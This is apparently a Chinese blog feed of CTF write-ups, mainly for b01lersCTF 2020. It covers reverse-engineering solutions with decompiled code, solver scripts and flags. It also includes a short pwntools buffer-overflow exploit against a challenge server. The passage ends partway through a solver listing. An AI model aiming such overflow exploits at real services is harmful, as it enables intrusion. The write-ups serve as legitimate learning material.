&quot;magic %s&quot; % (magic.encode(&#39;hex&#39;))    print &quot;moddate %s (%s)&quot; % (moddate.encode(&#39;hex&#39;), modtime)    code = marshal.load(f)    show_code(code)def show_code(code, indent=&#39;&#39;):    print &quot;%scode&quot; % indent    indent += &#39;   &#39;    print &quot;%sargcount %d&quot; % (indent, code.co_argcount)    print &quot;%snlocals %d&quot; % (indent, code.co_nlocals)    print &quot;%sstacksize %d&quot; % (indent, code.co_stacksize)    print &quot;%sflags %04x&quot; % (indent, code.co_flags)    show_hex(&quot;code&quot;, code.co_code, indent=indent)    dis.disassemble(code)    print &quot;%sconsts&quot; % indent    for const in code.co_consts:        if type(const) == types.CodeType:            show_code(const, indent + &#39;   &#39;)        else:            print &quot;   %s%r&quot; % (indent, const)    print &quot;%snames %r&quot; % (indent, code.co_names)    print &quot;%svarnames %r&quot; % (indent, code.co_varnames)    print &quot;%sfreevars %r&quot; % (indent, code.co_freevars)    print &quot;%scellvars %r&quot; % (indent, code.co_cellvars)    print &quot;%sfilename %r&quot; % (indent, code.co_filename)    print &quot;%sname %r&quot; % (indent, code.co_name)    print &quot;%sfirstlineno %d&quot; % (indent, code.co_firstlineno)    show_hex(&quot;lnotab&quot;, code.co_lnotab, indent=indent)def show_hex(label, h, indent):    h = h.encode(&#39;hex&#39;)    if len(h) &lt; 60:        print &quot;%s%s %s&quot; % (indent, label, h)    else:        print &quot;%s%s&quot; % (indent, label)        for i in range(0, len(h), 60):            print &quot;%s   %s&quot; % (indent, h[i:i + 60])show_file(sys.argv[1])</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>攻防世界</tag>
      
      <tag>python</tag>
      
      <tag>opcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>b01lersCTF-2020-wp</title>
    <link href="/2020/03/16/b01lersCTF-2020-wp/"/>
    <url>/2020/03/16/b01lersCTF-2020-wp/</url>
    
    <content type="html"><![CDATA[<p>这个比赛还算友好，而且少见的逆向比web还要多，出题人说之后会放源码和官方writeup，是个不错的学习的机会，这里把做出来的几道题先写一下（然后开始写作业……</p><a id="more"></a><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Welcome-to-Earth"><a href="#Welcome-to-Earth" class="headerlink" title="Welcome to Earth"></a>Welcome to Earth</h4><p>我对web实际上是毫无兴趣的，但这题实在简单的过分，还是给做了，详细的就不说了，查看源码就可以发现，只要在调用<code>dead</code>之前进入到应该进去的页面就可以了（直接<code>F12</code>里debug暂停然后慢慢看就可以了……</p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>pwn也很久没做了，知识点还停留在刚学的时候，应付一下第一题就完事了</p><h4 id="Department-of-Flying-Vehicles"><a href="#Department-of-Flying-Vehicles" class="headerlink" title="Department of Flying Vehicles"></a>Department of Flying Vehicles</h4><p>IDA打开<del>(逆向看久了之后发现pwn题目的逻辑真的是简单得要命)</del>，漏洞也看得出来，利用的话还是不熟练，需要多练</p><pre><code class="c++">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  __int64 v3; // rax  char s1[8]; // [rsp+0h] [rbp-20h]  __int64 v6; // [rsp+8h] [rbp-18h]  __int64 v7; // [rsp+10h] [rbp-10h]  unsigned __int64 v8; // [rsp+18h] [rbp-8h]  v8 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  v6 = 1176165807576793170LL;  v7 = 1154282520852565777LL;  puts(&quot;Dave has ruined our system. He updated the code, and now he even has trouble checking his own liscense!&quot;);  puts(&quot;If you can please make it work, we&#39;ll reward you!\n&quot;);  puts(&quot;Welcome to the Department of Flying Vehicles.&quot;);  printf(&quot;Which liscense plate would you like to examine?\n &gt; &quot;, 0LL);  gets(s1);  if ( v6 == (v7 ^ *(_QWORD *)s1) )  {    if ( !strncmp(s1, &quot;COOLDAV&quot;, 8uLL) )    {      puts(&quot;Hi Dave!&quot;);    }    else    {      v3 = sub_96A(&quot;flag.txt&quot;, &quot;COOLDAV&quot;);      printf(&quot;Thank you so much! Here&#39;s your reward!\n%s&quot;, v3);    }  }  else  {    puts(&quot;Error.&quot;);  }  return 0LL;}</code></pre><p>如果想要通过第一个if就必须要输入<code>COOLDAV</code>，这样的话就过不了第二个输入，看到<code>gets</code>直接考虑溢出覆盖变量的值，最简单的方法就是输入和其中的一个变量全都为<code>\0</code></p><pre><code class="python">from pwn import *# io=process(&#39;./dfv&#39;)io=remote(&#39;pwn.ctf.b01lers.com&#39;,1001)io.recvuntil(&#39;Which liscense plate would you like to examine?\n &gt; &#39;)payload=4*p64(0)io.sendline(payload)io.interactive()</code></pre><p>就可以拿到flag<del>(但我忘了记录flag得值又懒得再跑一遍拿flag)</del></p><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h4 id="Chugga-Chugga"><a href="#Chugga-Chugga" class="headerlink" title="Chugga Chugga"></a>Chugga Chugga</h4><p>IDA打开</p><pre><code class="c++">void __fastcall __noreturn main_main(__int64 a1, __int64 a2){  signed __int64 i; // rcx  __int64 v3; // r8  __int64 v4; // r9  __int64 v5; // r8  __int64 v6; // r9  __int64 v7; // r8  __int64 v8; // r9  __int64 v9; // r8  __int64 v10; // r9  unsigned __int64 v11; // rcx  _BYTE *v12; // rdx  signed __int64 v13; // rax  char v14; // bl  char v15; // r10  int v16; // er11  char v17; // r12  char v18; // r13  int v19; // er13  int v20; // er14  int v21; // ecx  int v22; // er14  char v23; // cl  unsigned int v24; // er13  char v25; // r11  char v26; // r12  _QWORD *v27; // [rsp+8h] [rbp-A0h]  signed __int64 v28; // [rsp+40h] [rbp-68h]  _QWORD *v29; // [rsp+48h] [rbp-60h]  __int128 v30; // [rsp+50h] [rbp-58h]  __int128 v31; // [rsp+60h] [rbp-48h]  __int128 v32; // [rsp+70h] [rbp-38h]  __int128 v33; // [rsp+80h] [rbp-28h]  __int128 v34; // [rsp+90h] [rbp-18h]  if ( (unsigned __int64)&amp;v33 &lt;= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) )    runtime_morestack_noctxt();  runtime_newobject(a1, a2);  v29 = v27;  for ( i = 0LL; ; i = v13 )  {    v28 = i;    runtime_convT64(a1, a2);    *(_QWORD *)&amp;v33 = &amp;unk_4A4C40;    *((_QWORD *)&amp;v33 + 1) = &amp;main_statictmp_2;    *(_QWORD *)&amp;v34 = &amp;unk_4A4480;    *((_QWORD *)&amp;v34 + 1) = v27;    a2 = (__int64)&amp;go_itab__os_File_io_Writer;    fmt_Fprintln(      a1,      (__int64)&amp;go_itab__os_File_io_Writer,      (__int64)&amp;main_statictmp_2,      (__int64)&amp;unk_4A4C40,      v3,      v4,      (__int64)&amp;go_itab__os_File_io_Writer,      os_Stdout);    *(_QWORD *)&amp;v32 = &amp;unk_4A4C40;    *((_QWORD *)&amp;v32 + 1) = &amp;main_statictmp_3;    fmt_Fprintln(      a1,      (__int64)&amp;go_itab__os_File_io_Writer,      (__int64)&amp;v32,      (__int64)&amp;main_statictmp_3,      v5,      v6,      (__int64)&amp;go_itab__os_File_io_Writer,      os_Stdout);    *(_QWORD *)&amp;v31 = &amp;unk_4A1DC0;    *((_QWORD *)&amp;v31 + 1) = v29;    fmt_Fscan(      a1,      (__int64)&amp;go_itab__os_File_io_Writer,      (__int64)&amp;v31,      (__int64)v29,      v7,      v8,      (__int64)&amp;go_itab__os_File_io_Reader,      os_Stdin);    v11 = v29[1];    v12 = (_BYTE *)*v29;    if ( v11 &lt;= 2 )      break;    if ( v12[2] != 116 )      goto LABEL_39;    if ( v11 &lt;= 9 )      break;    a2 = (unsigned __int8)v12[9];    if ( (_BYTE)a2 != 99 )      goto LABEL_39;    if ( v11 &lt;= 0x10 )      break;    a1 = (unsigned __int8)v12[16];    if ( (_BYTE)a1 != 110 )      goto LABEL_39;    if ( v11 &lt;= 0x15 )      break;    v9 = (unsigned __int8)v12[21];    if ( (_BYTE)v9 != 122 )      goto LABEL_39;    if ( v11 &lt;= 0x16 )      break;    if ( v12[22] != 125 )      goto LABEL_39;    v10 = (unsigned __int8)v12[5];    if ( 115 != (_BYTE)v10 )      goto LABEL_39;    if ( (v12[3] ^ 0x74) != 18 )      goto LABEL_39;    v14 = v12[1];    if ( v14 != 99 )      goto LABEL_39;    a2 = (unsigned __int8)v12[7];    if ( (_BYTE)a2 != 100 )      goto LABEL_39;    v15 = v12[13];    if ( v12[12] != v15 )      goto LABEL_39;    if ( 122 != v12[19] )      goto LABEL_39;    v9 = (unsigned __int8)v12[14];    v16 = (unsigned __int8)v12[6];    if ( (_BYTE)v16 + (_BYTE)v9 != 104 )      goto LABEL_39;    v17 = v12[4];    if ( 123 != v17 )      goto LABEL_39;    v18 = v12[8];    if ( v12[15] != v18 )      goto LABEL_39;    if ( v18 + 4 != v14 )      goto LABEL_39;    v19 = (unsigned __int8)v12[17];    v20 = (unsigned __int8)v12[11];    if ( 125 - (_BYTE)v19 + 40 != (_BYTE)v20 )      goto LABEL_39;    v21 = (unsigned __int8)v12[18];    v22 = v19 + v20 - v10 - v21;    v23 = v21 - v19;    if ( (_BYTE)v22 != v23      || (v24 = v16 - v19, *v12 != v23 * ((unsigned __int8)v24 &gt;&gt; 1) + 110)      || (v25 = v12[10], v15 + 1 != v25)      || (v26 = v17 - a2, a2 = v24, (_BYTE)v24 + 2 * (_BYTE)v24 + 4 * v26 != v25)      || v12[20] - v14 != 2 * v23      || (v10 = (unsigned int)a1 ^ (unsigned int)v10, (_BYTE)v10 != 29)      || (_BYTE)v24 != 4 * v23      || v12[6] != (_BYTE)v9 )    {LABEL_39:      *(_QWORD *)&amp;v30 = &amp;unk_4A4C40;      *((_QWORD *)&amp;v30 + 1) = &amp;main_statictmp_4;      fmt_Fprintln(        a1,        a2,        (__int64)&amp;v30,        (__int64)&amp;main_statictmp_4,        v9,        v10,        (__int64)&amp;go_itab__os_File_io_Writer,        os_Stdout);      v13 = v28 + 1;    }    else    {      main_win();      v13 = v28;    }  }  runtime_panicindex(a1, a2, v12);}</code></pre><p>所有的判断条件都在这个函数里，直接根据条件解出来flag就可以了，至于为什么不写具体的过程，因为我是在演草纸上自己动手解的方程，只要耐心分析就可以了</p><blockquote><p>这里有一个疑问，标记一下，解方程的时候可以解出来两解，应该有地方可以排除掉，但我直接根据语义选择的flag</p></blockquote><pre><code>pctf{s4d_chugg4_n01zez}</code></pre><h4 id="Dank-Engine"><a href="#Dank-Engine" class="headerlink" title="Dank Engine"></a>Dank Engine</h4><p>脑洞题<del>(这游戏根本就玩不过去……</del></p><p>走到地图中间怎么都跳不上去，到了最右边发现不能走了但是地图没完，后面接着长长的一条路，所以一直往右边拉，看到<code>pctf</code>，找到了flag的位置</p><p><del>(然后为了找flag跑崩了四次虚拟机……显卡和cpu看样8太行)</del></p><p>用鼠标上下没法超出屏幕，用<code>alt+f7</code>移动窗口慢慢找，感觉应该有逆向方法，那个pck包我至今还没解开</p><pre><code>PCTF{ITWASTIMEFORTHOMASTOGO_HEHADSEENEVERYTHING}</code></pre><hr><p>来补充一下，IDA可以直接打开pck包，里面有关于人物的设定</p><pre><code>&#39;# Global Variables&#39;,0Ahseg000:0000000000004610                 db &#39;var g_direction&#39;,0Ahseg000:0000000000004610                 db &#39;var g_velocity&#39;,0Ahseg000:0000000000004610                 db &#39;var g_parent&#39;,0Ahseg000:0000000000004610                 db &#39;var g_airborne&#39;,0Ahseg000:0000000000004610                 db &#39;var g_delta&#39;,0Ahseg000:0000000000004610                 db &#39;var g_cheat_stack&#39;,0Ahseg000:0000000000004610                 db &#39;var g_god_mode&#39;,0Ah</code></pre><p>惊奇的发现下面还有一个上帝模式和开启方法</p><pre><code> db 9,&#39;if self.g_cheat_stack == [&quot;P&quot;, &quot;U&quot;, &quot;R&quot;, &quot;G&quot;, &quot;0&quot;, &quot;0&quot;]:&#39;,0Ahseg000:0000000000004610                 db 9,9,&#39;self.g_god_mode = not self.g_god_mode&#39;,0Ahseg000:0000000000004610                 db 9,9,&#39;$CollisionShape2D.disabled = not $CollisionShape2D.disabled&#39;,0Ah</code></pre><p>方法就是按键直接输入<code>PURG00</code>，打开之后就可以飞和穿墙，直接跑到flag在的地方去看就可以了</p><p><del>(亏我还调窗口大小调了这么久)</del></p><p>Digital Sloth</p><p>这题的逻辑很简单</p><pre><code class="c++">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  signed int v3; // esi  signed __int64 v4; // rdx  signed __int64 v5; // r12  int *v6; // r13  __int64 v7; // rax  signed __int64 v8; // rbp  unsigned __int64 v9; // rdx  signed int v10; // eax  int v11; // edi  int v12; // ecx  __int64 v14; // [rsp+0h] [rbp-68h]  __int64 v15; // [rsp+8h] [rbp-60h]  __int64 v16; // [rsp+10h] [rbp-58h]  __int64 v17; // [rsp+18h] [rbp-50h]  __int64 v18; // [rsp+20h] [rbp-48h]  __int64 v19; // [rsp+28h] [rbp-40h]  int v20; // [rsp+30h] [rbp-38h]  int v21; // [rsp+34h] [rbp-34h]  unsigned __int64 v22; // [rsp+38h] [rbp-30h]  v3 = 51;  v4 = 3LL;  v5 = 113LL;  v22 = __readfsqword(0x28u);  v20 = 1422670297;  v14 = -3319278099595541965LL;  v6 = (int *)((char *)&amp;v14 + 1);  v15 = -422936419575592362LL;  v16 = -4095196370651919852LL;  v17 = 8155891993347461205LL;  v18 = 2743091852077296222LL;  v19 = -5317187183026317550LL;  while ( 1 )  {    v7 = 0LL;    v8 = 1LL;    if ( v4 )    {      do      {        ++v7;        v8 *= v5;      }      while ( v7 != v4 );    }    v9 = v8;    v10 = 8;    v11 = 0;    do    {      v12 = (unsigned __int8)v9;      v9 &gt;&gt;= 8;      v11 ^= v12;      --v10;    }    while ( v10 );    _IO_putc(v3 ^ v11, stdout);    fflush(stdout);    if ( &amp;v21 == v6 )      break;    v3 = *(unsigned __int8 *)v6;    v4 = v5;    v6 = (int *)((char *)v6 + 1);    v5 = v8;  }  return 0LL;}</code></pre><p>直接会输出flag的那种，但是一运行只输出了三个字符，明显是计算大数乘幂的时候算法时间复杂度太高了(<strong>O(n^2)</strong>)，想要算出flag必须手动优化一下算法，利用平方把时间复杂度优化到<strong>O(logn)</strong>，在大数的时候明显优化的不是一点</p><pre><code class="c++">#include &lt;iostream&gt;using namespace std;typedef unsigned long long ull;ull qpow(ull x, ull n) {    ull res = 1;    ull mod = 0xffffffffffffffff;    while (n) {        if (n &amp; 1)            res = res * x &amp; mod;    //如果二进制最低位为1，则乘上x^(2^i)        x = x * x &amp; mod;        n &gt;&gt;= 1;    }    return res;}int main() {    ull v4; // rdx    ull v5; // r12    ull v8; // rbp    ull v9; // rdx    signed int v10; // eax    int v11; // edi    int v12; // ecx    v4 = 3;    v5 = 113;    int v3[] = {0x33, 0xC2, 0xDF, 0x9A, 0x27, 0x8E, 0xEF, 0xD1, 0x56, 0x0A, 0x9F, 0x34, 0x91, 0x6D, 0x21, 0xFA,                0x14, 0xCA, 0xD2, 0x21, 0x99, 0xF0, 0x2A, 0xC7, 0x55, 0x90, 0xED, 0x61, 0x8E, 0x8C, 0x2F, 0x71,                0x5E, 0xEA, 0x55, 0x85, 0x81, 0x6B, 0x11, 0x26, 0x12, 0xD7, 0x74, 0xBF, 0x6D, 0x8E, 0x35, 0xB6,                0xD9, 0x39, 0xCC, 0x54};    for (int i = 0; i &lt; 52; i++) {        v8 = 1;        if (v4) {            v8 *= qpow(v5, v4);        }        v9 = v8;        v10 = 8;        v11 = 0;        do {            v12 = v9 &amp; 0xff;            v9 &gt;&gt;= 8;            v11 ^= v12;            --v10;        } while (v10);        char tmp=v3[i] ^ v11;        cout &lt;&lt; tmp;        v4 = v5;        v5 = v8;    }    return 0;}</code></pre><hr><p>又是一道分割线，看了其它大佬的wp才知道……直接用python的<code>pow</code>不就好了……</p><p>直接输出flag</p><pre><code>pctf{one man&#39;s trash is another man&#39;s V#x0GFu_Lp%3}</code></pre><p><del>看到最后一段甚至感觉做错了，到现在没看懂</del></p><h4 id="train-arms"><a href="#train-arms" class="headerlink" title="train_arms"></a>train_arms</h4><p><del>arm一语双关，妙啊</del></p><p>这题就直接看汇编了</p><pre><code class="asm">.cpu cortex-m0.thumb.syntax unified.fpu softvfp.data     flag: .string &quot;REDACTED&quot; //len = 28.text.global mainmain:    ldr r0,=flag    eors r1,r1    eors r2,r2    movs r7,#1                ; r7=1    movs r6,#42                ; r6=42loop:    ldrb r2,[r0,r1]    cmp r2,#0    beq exit    lsls r3,r1,#0    ands r3,r7                ; 区分奇偶位    cmp r3,#0    bne f1//if odd    strb r2,[r0,r1]    adds r1,#1    b loopf1:    eors r2,r6    strb r2,[r0,r1]    adds r1,#1    b loopexit:    wfi</code></pre><p>虽然没怎么接触过arm的汇编，但是这里还是很容易的，把flag分奇偶位进行操作，奇数位不动，偶数位异或42，最终结果输出到文件，所以打开文件</p><pre><code>7049744c7b5e721e31447375641a6e5e5f42345c337561586d597d</code></pre><p>明显16进制输出，写个脚本跑一下</p><pre><code class="python">target = [0x70, 0x49, 0x74, 0x4c, 0x7b, 0x5e, 0x72, 0x1e, 0x31, 0x44, 0x73, 0x75, 0x64, 0x1a, 0x6e, 0x5e, 0x5f, 0x42,          0x34, 0x5c, 0x33, 0x75, 0x61, 0x58, 0x6d, 0x59, 0x7d]flag = &#39;&#39;for i in range(len(target)):    if i &amp; 1:        flag += chr(target[i] ^ 42)    else:        flag += chr(target[i])print(flag)</code></pre><p>直接输出flag</p><pre><code>pctf{tr41ns_d0nt_h4v3_arms}</code></pre><h4 id="Little-Engine"><a href="#Little-Engine" class="headerlink" title="Little Engine"></a>Little Engine</h4><blockquote><p>我觉得这题很不错，难度比较适中，还可以加深对于数据在内存中占用位数的理解</p></blockquote><pre><code class="c++">__int64 __usercall main@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, char **a2@&lt;rsi&gt;, char **a3@&lt;rdx&gt;, __int64 a4@&lt;rbx&gt;, _QWORD *a5@&lt;r12&gt;){  signed __int64 v5; // rdx  unsigned __int64 v6; // rcx  const char *v7; // rsi  __int64 v8; // rdx  __int64 v9; // rcx  __int64 v10; // rdi  __int64 v12; // [rsp+0h] [rbp-28h]  unsigned __int64 v13; // [rsp+18h] [rbp-10h]  __asm { endbr64 }  v13 = __readfsqword(0x28u);  sub_16B0(a1, a2, a3);  sub_1830(&amp;v12);  sub_1510(v5, v6, a4, &amp;v12, &amp;v12, (unsigned __int64)a2, a5);  if ( (unsigned __int8)sub_15A0(&amp;v12) )  {    v7 = &quot;Chugga chugga choo choo you&#39;re the little engine that CAN!&quot;;    sub_11F0(&amp;std::cout, &quot;Chugga chugga choo choo you&#39;re the little engine that CAN!&quot;, 58LL);  }  else  {    v7 = &quot;I guess you don&#39;t know anything about trains...go do some TRAINing you non-conductor :(&quot;;    sub_11F0(      &amp;std::cout,      &quot;I guess you don&#39;t know anything about trains...go do some TRAINing you non-conductor :(&quot;,      87LL);  }  sub_1170(&amp;std::cout);  v10 = v12;  if ( v12 )    sub_11C0(v12, v7, v8, v9);  if ( __readfsqword(0x28u) != v13 )  {    sub_11E0(v10, v7, v8, v9);    __asm { endbr64 }    JUMPOUT(&amp;loc_12D1);  }  return 0LL;}</code></pre><p>话好多，第一句说明正确，第二句说明错误，逻辑就很清楚了，if的条件是一个用来判断的函数</p><p>程序在<code>sub_1830()</code>里进行输入，在<code>sub_1510()</code>进行了一些处理然后判断</p><pre><code class="c++">__int64 *__fastcall sub_1830(__int64 *a1){  __int64 *v1; // r12  unsigned __int64 v2; // rsi  unsigned __int8 *v3; // rdx  __int64 v4; // rcx  __int64 v5; // rbx  __int64 v6; // r13  __int64 v7; // rax  char *v8; // rdi  char *v9; // r8  __int64 v10; // rdx  _BYTE *v11; // rax  char *v13; // [rsp+0h] [rbp-58h]  __int64 v14; // [rsp+8h] [rbp-50h]  char v15; // [rsp+10h] [rbp-48h]  unsigned __int64 v16; // [rsp+28h] [rbp-30h]  __asm { endbr64 }  v1 = a1;  v16 = __readfsqword(0x28u);  sub_11F0(&amp;std::cout, &quot;Now, I hope you&#39;re a total trainiac. Give me your best tidbit: &quot;, 63LL);  v2 = (unsigned __int64)&amp;v13;  v13 = &amp;v15;  v14 = 0LL;  v15 = 0;  sub_1220(&amp;std::cin, &amp;v13);  v5 = v14;  v6 = (__int64)v13;  a1[2] = 0LL;  *(_OWORD *)a1 = 0LL;  if ( v5 &lt; 0 )  {LABEL_32:    sub_1190(&quot;cannot create std::vector larger than max_size()&quot;);    __asm { endbr64 }    JUMPOUT(&amp;loc_12AA);  }  if ( v5 )  {    v7 = sub_11D0(v5);    v8 = (char *)(v7 + v5);    *v1 = v7;    v9 = v13;    v1[2] = v7 + v5;    if ( (unsigned __int64)(v6 + 15 - v7) &lt;= 0x1E || (unsigned __int64)(v5 - 1) &lt;= 0xE )    {      v3 = 0LL;      do      {        v4 = v3[v6];        (v3++)[v7] = v4;      }      while ( (unsigned __int8 *)v5 != v3 );    }    else    {      v10 = 0LL;      do      {        *(__m128i *)(v7 + v10) = _mm_loadu_si128((const __m128i *)(v6 + v10));        v10 += 16LL;      }      while ( v10 != (v5 &amp; 0xFFFFFFFFFFFFFFF0LL) );      v2 = v5 &amp; 0xFFFFFFFFFFFFFFF0LL;      v4 = v5 &amp; 0xF;      v3 = (unsigned __int8 *)(v6 + (v5 &amp; 0xFFFFFFFFFFFFFFF0LL));      v11 = (_BYTE *)((v5 &amp; 0xFFFFFFFFFFFFFFF0LL) + v7);      if ( v5 != (v5 &amp; 0xFFFFFFFFFFFFFFF0LL) )      {        v2 = *v3;        *v11 = v2;        if ( v4 != 1 )        {          v2 = v3[1];          v11[1] = v2;          if ( v4 != 2 )          {            v2 = v3[2];            v11[2] = v2;            if ( v4 != 3 )            {              v2 = v3[3];              v11[3] = v2;              if ( v4 != 4 )              {                v2 = v3[4];                v11[4] = v2;                if ( v4 != 5 )                {                  v2 = v3[5];                  v11[5] = v2;                  if ( v4 != 6 )                  {                    v2 = v3[6];                    v11[6] = v2;                    if ( v4 != 7 )                    {                      v2 = v3[7];                      v11[7] = v2;                      if ( v4 != 8 )                      {                        v2 = v3[8];                        v11[8] = v2;                        if ( v4 != 9 )                        {                          v2 = v3[9];                          v11[9] = v2;                          if ( v4 != 10 )                          {                            v2 = v3[10];                            v11[10] = v2;                            if ( v4 != 11 )                            {                              v2 = v3[11];                              v11[11] = v2;                              if ( v4 != 12 )                              {                                v2 = v3[12];                                v11[12] = v2;                                if ( v4 != 13 )                                {                                  v2 = v3[13];                                  v11[13] = v2;                                  if ( v4 != 14 )                                  {                                    v3 = (unsigned __int8 *)v3[14];                                    v11[14] = (_BYTE)v3;                                  }                                }                              }                            }                          }                        }                      }                    }                  }                }              }            }          }        }      }    }  }  else  {    v9 = (char *)v6;    v8 = 0LL;  }  v1[1] = (__int64)v8;  if ( v9 != &amp;v15 )  {    v8 = v9;    sub_11C0(v9, v2, v3, v4);  }  if ( __readfsqword(0x28u) != v16 )  {    sub_11E0(v8, v2, v3, v4);    goto LABEL_32;  }  return v1;}</code></pre><p>程序看起来异常复杂，但是经过我的仔细分(tiao)析(shi)，发现只是把输入拷贝到了内存里分配好的空间。</p><pre><code class="c++">__int64 __usercall sub_1510@&lt;rax&gt;(signed __int64 a1@&lt;rdx&gt;, unsigned __int64 a2@&lt;rcx&gt;, __int64 a3@&lt;rbx&gt;, void *a4@&lt;rbp&gt;, __int64 *a5@&lt;rdi&gt;, unsigned __int64 a6@&lt;rsi&gt;, _QWORD *a7@&lt;r12&gt;){  _QWORD *v7; // rax  __int64 v8; // rdx  __int64 v9; // rcx  __int64 v10; // rdx  __int64 v11; // rcx  __int64 v12; // rdx  __int64 v13; // rcx  char **v14; // rdx  __int64 v15; // rax  _BYTE *v16; // rax  __int64 v17; // rcx  __int64 v18; // rcx  __int64 result; // rax  unsigned __int64 v20; // rt1  unsigned __int64 v21; // [rsp+18h] [rbp-10h]  void *retaddr; // [rsp+28h] [rbp+0h]  __asm { endbr64 }  v21 = __readfsqword(0x28u);  v15 = *a5;  if ( *a5 == a5[1] )  {LABEL_5:    v20 = __readfsqword(0x28u);    result = v20 ^ v21;    if ( v20 != v21 )    {      sub_11E0(a5, a6, a1, a2);      result = sub_15A0(a5);    }  }  else  {    a6 = 0LL;    a1 = 4294967185LL;    while ( 1 )    {      v16 = (_BYTE *)(a6 + v15);      v17 = (unsigned __int8)*v16;      if ( (_BYTE)v17 == 10 )        break;      *v16 = a1 ^ v17;      v18 = (unsigned __int8)a1 + a6++;      v15 = *a5;      a1 = (unsigned int)v18         + (unsigned int)((unsigned __int64)(0x8080808080808081LL * (unsigned __int128)(unsigned __int64)v18 &gt;&gt; 64) &gt;&gt; 7);      a2 = a5[1] - *a5;      if ( a6 &gt;= a2 )        goto LABEL_5;    }    v7 = (_QWORD *)sub_1180(8LL, a6, a1, v17, -9187201950435737471LL);    *v7 = &amp;unk_3CD0;    sub_1250(v7, &amp;`typeinfo for&#39;std::exception, &amp;std::exception::~exception);    sub_11C0(a4, &amp;`typeinfo for&#39;std::exception, v8, v9);    sub_1260(a7);    if ( *a7 )      sub_11C0(*a7, &amp;`typeinfo for&#39;std::exception, v10, v11);    if ( retaddr != a4 )      sub_11C0(retaddr, &amp;`typeinfo for&#39;std::exception, v10, v11);    sub_1260(a3);    if ( retaddr )      sub_11C0(retaddr, &amp;`typeinfo for&#39;std::exception, v12, v13);    sub_1260(a4);    result = main((__int64)a4, (char **)&amp;`typeinfo for&#39;std::exception, v14);  }  return result;}</code></pre><p>这又是一个异常复杂的函数，但实际上有用的内容并不多</p><pre><code class="c++">     a6 = 0LL;    a1 = 4294967185LL;    while ( 1 )    {      v16 = (_BYTE *)(a6 + v15);      v17 = (unsigned __int8)*v16;      if ( (_BYTE)v17 == 10 )        break;      *v16 = a1 ^ v17;      v18 = (unsigned __int8)a1 + a6++;      v15 = *a5;      a1 = (unsigned int)v18         + (unsigned int)((unsigned __int64)(0x8080808080808081LL * (unsigned __int128)(unsigned __int64)v18 &gt;&gt; 64) &gt;&gt; 7);      a2 = a5[1] - *a5;      if ( a6 &gt;= a2 )        goto LABEL_5;    }</code></pre><p>只有这里是对输入的处理，整个处理过程也就只有一个异或而已，这里比较有意思的是循环停止的判断条件，<code>a5</code>实际上是个数组，里面存放了两个地址，一个是我们输入的字符串开始的地址，另一个是结束的地址，实际上相减出来的值就是字符串的长度，但是看起来就比较复杂，逆向的时候理解起来就有些困难。</p><p>这里的处理其实很好办，<code>a1</code>这个值和我们的输入没关系，是循环中依据算法生成的，我们可以通过同样的算法生成，然后存放在一个数组里。</p><p>接下来是判断函数</p><pre><code class="c++">__int64 __fastcall sub_15A0(__int64 *a1){  _QWORD *v1; // rbp  __int64 v2; // rsi  __int64 v3; // rcx  __int64 v4; // rdx  unsigned int v5; // er12  const char *v6; // rdi  __int64 v7; // rdx  __int64 v8; // rcx  __int64 v10; // [rsp+0h] [rbp-158h]  __int64 v11; // [rsp+124h] [rbp-34h]  unsigned __int64 v12; // [rsp+138h] [rbp-20h]  __asm { endbr64 }  v12 = __readfsqword(0x28u);  qmemcpy(&amp;v10, &amp;unk_2220, 0x12CuLL);  v1 = (_QWORD *)sub_11D0(300LL);  *v1 = v10;  *(_QWORD *)((char *)v1 + 292) = v11;  qmemcpy(    (void *)((unsigned __int64)(v1 + 1) &amp; 0xFFFFFFFFFFFFFFF8LL),    (const void *)((char *)&amp;v10 - ((char *)v1 - ((unsigned __int64)(v1 + 1) &amp; 0xFFFFFFFFFFFFFFF8LL))),    8LL * (((unsigned int)v1 - (((_DWORD)v1 + 8) &amp; 0xFFFFFFF8) + 300) &gt;&gt; 3));  v2 = 0LL;  v3 = *a1;  v4 = a1[1] - *a1;  while ( 1 )  {    if ( v2 == v4 )    {      v6 = &quot;vector::_M_range_check: __n (which is %zu) &gt;= this-&gt;size() (which is %zu)&quot;;      sub_1230(&quot;vector::_M_range_check: __n (which is %zu) &gt;= this-&gt;size() (which is %zu)&quot;, v2, v2);      goto LABEL_10;    }    if ( *((_BYTE *)v1 + 4 * v2) != *(_BYTE *)(v3 + v2) )      break;    if ( ++v2 == 75 )    {      v5 = 1;      goto LABEL_6;    }  }  v5 = 0;LABEL_6:  v6 = (const char *)v1;  sub_11C0(v1, v2, v4, v3);  if ( __readfsqword(0x28u) != v12 )  {LABEL_10:    sub_11E0(v6, v2, v7, v8);    __asm { endbr64 }    JUMPOUT(&amp;loc_129A);  }  return v5;}</code></pre><p>各种操作看着吓人，仔细一看，只有一个直接比较</p><pre><code class="c++">if ( *((_BYTE *)v1 + 4 * v2) != *(_BYTE *)(v3 + v2) )</code></pre><p>前面的生成方式很复杂，但是可以不用去管，通过动态调试就可以调试出来目标数组，不过目标生成出来都是64位数据，比较的时候只取最低8位进行比较，还需要进行一些处理。</p><p>然后直接把处理过后的目标数组和之前依据相同算法生成出来的数组逐项异或就可以得到flag</p><pre><code class="c++">#include &lt;iostream&gt;#include &quot;ida.h&quot;using namespace std;int main() {    unsigned __int64 a5;    signed __int64 v8; // rdx    unsigned __int64 v11; // rcx    a5 = 0LL;    v8 = 0xFFFFFF91LL;    ll v8s[75];    v8s[0] = 0x91;    ll target[] = {0xE1, 0xF2, 0xE6, 0xF2, 0xEC, 0xEF, 0xC8, 0x95, 0xF2, 0xD8, 0x8E, 0xAC, 0xE0, 0xAD, 0x82, 0xA5, 0x79,                   0x6E, 0x18, 0x09, 0x3D, 0x3B, 0x4A, 0xE1, 0xC1, 0x8F, 0xB9, 0xC2, 0x52, 0x5E, 0x72, 0x51, 0xDC, 0x92,                   0xAA, 0x90, 0x39, 